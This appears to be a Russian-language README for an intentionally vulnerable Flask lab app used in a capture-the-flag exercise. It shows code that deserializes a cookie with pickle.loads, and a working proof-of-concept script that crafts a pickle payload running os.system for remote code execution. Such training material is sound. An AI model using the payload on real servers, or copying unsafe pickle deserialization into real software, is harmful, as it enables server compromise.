# TechLaunch Beta Waitlist - Уязвимое Flask приложение

## 📋 Описание проекта

TechLaunch - это демонстрационное веб-приложение для списка ожидания бета-тестирования, написанное на Flask. Приложение содержит преднамеренно внесенные уязвимости для образовательных целей в области кибербезопасности.

## ⚠️ Выявленные уязвимости

### 1. Небезопасная десериализация (CWE-502)
**Критичность:** Высокая  
**Расположение:** `app.py`, функция `thank_you()`

```python
# УЯЗВИМЫЙ КОД
manager_data = base64.b64decode(manager_cookie)
email_manager = pickle.loads(manager_data)  # RCE через pickle
```

**Воздействие:** Возможность выполнения произвольного кода на сервере

## 🔬 Proof of Concept

### Эксплойт для RCE через pickle

- После испекции запросов, отправляемых при вводе замечается base64-encoded строка в куках.
- Анализируем строку, расшифровываем и замечаем, что этот инстанс класса, который скорее всего десериализуется на сервере
Можно использовать данный скрипт для получения base64-encoded строки, которая после десериализации будет выполнять определенный код на сервере

```python
import pickle
import base64
import os

# Самый надежный способ - использовать tuple с функцией и аргументами
class RCE:
    def __reduce__(self):
        # Простая команда для проверки - создает файл
        return (os.system, ('touch /tmp/pwned_success_$(date +%s)',))

# Создаем payload
rce = RCE()
payload = pickle.dumps(rce)
encoded_payload = base64.b64encode(payload).decode()

print(encoded_payload)
```

Полученную строку необходимо вставить в куки (email-manager) вашей сессии на странице /thank-you и обновить ее
При обработке данного объекта на сервере произойдет Remote code execution. 

## 🛠️ Установка и запуск

### Локальная разработка

```bash
# Клонирование репозитория
git clone <repository-url>
cd ctf-4

# Установка зависимостей
pip install -r requirements.txt

# Запуск приложения
python app.py
```

### Docker развертывание

```bash
# Сборка образа
docker build -t techlaunch-app .

# Запуск контейнера
docker run -p 5000:5000 techlaunch-app
```

Приложение будет доступно по адресу: `http://localhost:5000`

## 📁 Структура проекта

```
ctf-4/
├── app.py                 # Основное Flask приложение
├── templates/
│   ├── index.html         # Главная страница
│   └── thank_you.html     # Страница подтверждения
├── requirements.txt       # Зависимости Python
├── Dockerfile            # Конфигурация Docker
└── README.md            # Документация
```

